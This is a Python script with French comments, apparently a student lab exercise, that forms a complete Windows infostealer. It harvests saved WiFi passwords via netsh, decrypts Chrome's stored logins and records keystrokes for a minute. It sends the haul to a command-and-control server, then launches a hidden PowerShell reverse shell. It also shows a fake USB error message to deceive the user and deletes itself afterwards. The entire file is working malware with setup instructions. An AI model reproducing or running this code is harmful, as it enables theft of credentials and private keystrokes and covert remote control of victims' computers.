import subprocess
import sqlite3
import os
import requests
import time
import random
import json
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import win32crypt  # Nécessite pywin32 (pip install pywin32)
from pynput.keyboard import Listener  # Nécessite pynput (pip install pynput) pour keylogger

# How-To : 
# 1. Installez dépendances sur Windows : pip install pywin32 cryptography pynput requests
# 2. Exécutez en admin pour accès aux creds.
# 3. C2 : Remplacez IP/port par votre serveur Kali (ex. Flask ou ngrok).
# 4. WiFi : Utilise netsh.
# 5. Chrome : Décrypte avec master key AES (versions récentes).
# 6. Keylogger : Log 60s de frappes.
# 7. Exfil : POST JSON.
# 8. Reverse shell : PowerShell TCP vers nc sur Kali.
# 9. Furtif : Délai random, no prints sauf faux message, suppression du script.
# 10. Testez en VM. Matricule : 2315529.

# Étape 1: Extraire identifiants WiFi
def extract_wifi_creds():
    try:
        profiles_output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], text=True)
        # print("profils detectes (brut) :", profiles_output)  # Debug: Commenter pour furtivité
        wifi_data = {}
        for line in profiles_output.split('\n'):
            if "All User Profile" in line:
                profile_name = line.split(':')[1].strip()
                # print("profil trouve :", profile_name)  # Debug
                try:
                    details_cmd = ['netsh', 'wlan', 'show', 'profile', 'name="' + profile_name + '"', 'key=clear']
                    details = subprocess.check_output(details_cmd, text=True)
                    # print("Détails bruts :", details)  # Debug
                    for detail in details.split('\n'):
                        # print("Ligne analysée :", detail)  # Debug
                        if "Key Content" in detail:
                            key_value = detail.split(':')[1].strip()
                            # print(f"Clé trouvée pour {profile_name} : {key_value}")  # Debug
                            wifi_data[profile_name] = key_value
                except subprocess.CalledProcessError as e:
                    # print(f"Erreur subprocess pour {profile_name} : {e}")  # Debug
                    pass
                except Exception as e:
                    # print(f"Erreur inattendue pour {profile_name} : {e}")  # Debug
                    pass
        # print("Donnees WiFi Finales :", wifi_data)  # Debug
        return wifi_data
    except Exception as e:
        # print("Erreur globale :", str(e))  # Debug
        return {"error": str(e)}

# Étape 2: Extraire identifiants Chrome (gère AES pour versions récentes)
def extract_browser_creds():
    try:
        # Master key de Local State
        local_state_path = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Local State')
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        master_key_encoded = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key_encoded = master_key_encoded[5:]  # Enlever 'DPAPI'
        master_key = win32crypt.CryptUnprotectData(master_key_encoded, None, None, None, 0)[1]

        # Copie et connexion à Login Data
        chrome_db = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\Login Data')
        if not os.path.exists(chrome_db):
            return [{"error": "Chrome DB not found"}]
        temp_db = os.path.expanduser(r'~\AppData\Local\Temp\LoginData.db')
        os.system(f'copy "{chrome_db}" "{temp_db}"')  # Copie pour éviter lock
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        credentials = []
        for row in cursor.fetchall():
            url, username, encrypted_pass = row
            if not encrypted_pass:
                continue
            try:
                if encrypted_pass.startswith(b'v10') or encrypted_pass.startswith(b'v11'):  # AES Chrome >=80
                    iv = encrypted_pass[3:15]
                    payload = encrypted_pass[15:-16]
                    tag = encrypted_pass[-16:]
                    cipher = AESGCM(master_key)
                    password = cipher.decrypt(iv, payload, tag).decode('utf-8')
                else:  # Ancienne DPAPI
                    password = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8')
                credentials.append({"url": url, "username": username, "password": password})
            except Exception as dec_err:
                # print(f"Erreur décryptage : {dec_err}")  # Debug
                continue
        conn.close()
        os.remove(temp_db)  # Nettoyage
        return credentials
    except Exception as e:
        # print(f"Erreur globale browser : {e}")  # Debug
        return [{"error": str(e)}]

# Étape 2.5: Keylogger simple (capture 60s)
def capture_keystrokes(duration=60):
    keys = []
    def on_press(key):
        keys.append(str(key).replace("'", ""))
    with Listener(on_press=on_press) as listener:
        time.sleep(duration)
        listener.stop()
    return ''.join(keys)

# Étape 3: Envoyer à C2 (furtif)
def send_to_c2(data):
    c2_url = "http://192.168.2.154:8080"  # Remplacez par votre C2
    try:
        requests.post(c2_url, json=data, timeout=10)
    except:
        pass

# Étape 4: Reverse shell (originalité)
def open_reverse_shell():
    try:
        ps_command = '$client = New-Object System.Net.Sockets.TCPClient("192.168.2.154", 4444);'  # Remplacez IP/port
        ps_command += '$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;'
        ps_command += '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );'
        ps_command += '$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
        subprocess.Popen(['powershell', '-NoP', '-NonI', '-W', 'Hidden', '-Exec', 'Bypass', ps_command])
    except:
        pass

# Main
if __name__ == "__main__":
    time.sleep(random.randint(1, 10))  # Délai random
    print("Erreur USB détectée - Veuillez retirer et réinsérer la clé.")  # Faux message
    wifi_data = extract_wifi_creds()
    browser_data = extract_browser_creds()
    keys_logged = capture_keystrokes()
    payload = {"wifi": wifi_data, "browser": browser_data, "keys": keys_logged, "matricules": "2315529", "victim_ip": "192.168.2.140"}
    send_to_c2(payload)
    open_reverse_shell()
    try:
        os.remove(__file__)  # Suppression
    except:
        pass
